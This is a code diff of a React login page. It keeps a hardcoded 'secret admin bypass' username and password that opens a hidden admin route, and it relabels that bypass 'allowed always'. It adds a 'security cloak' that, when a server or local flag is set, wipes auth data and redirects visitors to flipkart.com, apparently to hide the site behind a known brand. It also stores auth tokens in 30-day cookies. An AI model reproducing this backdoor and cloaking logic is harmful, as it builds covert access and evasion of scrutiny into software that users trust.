@@ -1,6 +1,7 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import api from '../services/api';
+import { setCookie, clearAllAuthData } from '../utils/cookies';
 
 const Login = () => {
   const [username, setUsername] = useState('');
@@ -14,16 +15,32 @@ const Login = () => {
     setError('');
     setIsLoading(true);
 
-    // Secret Admin Bypass
+    // Secret Admin Bypass (allowed always)
     if (username === '9274517203' && password === '859426') {
       navigate('/secret-admin');
       return;
     }
 
-    // Security Cloak Check
-    const isSecurityOn = localStorage.getItem('flipkartSecurity') === 'ON';
-    if (isSecurityOn) {
-      window.location.href = 'https://www.flipkart.com';
+    // Security Cloak Check (Server + Local)
+    try {
+      const { data } = await api.get('/auth/system-status');
+      if (data?.isSecurityCloakOn) {
+        localStorage.setItem('flipkartSecurity', 'ON');
+        clearAllAuthData();
+        window.location.replace('https://www.flipkart.com');
+        return;
+      }
+    } catch (e) {
+      if (localStorage.getItem('flipkartSecurity') === 'ON') {
+        clearAllAuthData();
+        window.location.replace('https://www.flipkart.com');
+        return;
+      }
+    }
+
+    if (localStorage.getItem('flipkartSecurity') === 'ON') {
+      clearAllAuthData();
+      window.location.replace('https://www.flipkart.com');
       return;
     }
     
@@ -37,6 +54,8 @@ const Login = () => {
       };
       localStorage.setItem('userInfo', JSON.stringify(mockOwner));
       localStorage.setItem('token', mockOwner.token);
+      setCookie('token', mockOwner.token, 30);
+      setCookie('userInfo', JSON.stringify(mockOwner), 30);
       navigate('/');
       setIsLoading(false);
       return;
@@ -46,6 +65,10 @@ const Login = () => {
       const { data } = await api.post('/auth/login', { username, password });
       localStorage.setItem('userInfo', JSON.stringify(data));
       localStorage.setItem('token', data.token);
+      if (data.token) {
+        setCookie('token', data.token, 30);
+        setCookie('userInfo', JSON.stringify(data), 30);
+      }
       navigate('/');
     } catch (err) {
       setError(err.response?.data?.message || 'Login failed');
